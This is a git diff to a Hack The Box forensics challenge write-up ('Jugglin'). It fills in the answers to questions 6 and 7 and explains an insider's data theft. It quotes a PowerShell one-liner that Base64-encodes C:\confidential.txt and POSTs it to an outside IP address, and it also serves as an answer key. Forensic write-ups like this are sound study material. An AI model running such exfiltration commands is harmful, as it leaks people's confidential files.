@@ -1,4 +1,4 @@
-# Jugglin
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ecdaa8cb-9646-41a9-998d-0de4d1e4c520)# Jugglin
 > Write-up author: jon-brandy
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4cb55499-7ef4-4ed8-9329-06db9c054691)
@@ -115,7 +115,7 @@
 
 
 
-> 6TH QUESTION --> ANS:
+> 6TH QUESTION --> ANS: Invoke-WebRequest
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9facab44-2a2b-44b2-8c61-ee2cadb09b5a)
 
@@ -131,10 +131,27 @@ PAYLOAD USED:
 powershell.exe -c "Invoke-WebRequest -uri http://3.6.165.8/ -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\"C:\confidential.txt\")))"
 ```
 
-> 7TH QUESTION --> ANS:
+#### NOTES:
+
+```
+This command reads the contents of C:\confidential.txt, converts it to a Base64 string, and sends it via a POST
+request to the specified remote server (http://3.6.165.8/). This is a common technique used by attackers to exfiltrate
+sensitive data from a compromised system.
+```
+
+19. Based from the payload above, it's clear that the insider utilized `Invoke-WebRequest` module to extract data from the victim machine.
+
+> 7TH QUESTION --> ANS: RtlUTF8ToUnicodeN
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/208cef87-467d-4ac6-b57d-7fc451e123dd)
 
+
+20. Based from the previous finding, `MultiByteToWideChar` strings function has a child API string function named `RtlUTF8ToUnicodeN`.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e36b8c53-8785-40a9-b21f-d9929f23e481)
+
+
+21. The child API function is used to translate the specified source string into a Unicode String. It translates the source string using the UTF8 code page.
 
 > 8TH QUESTION --> ANS:
 
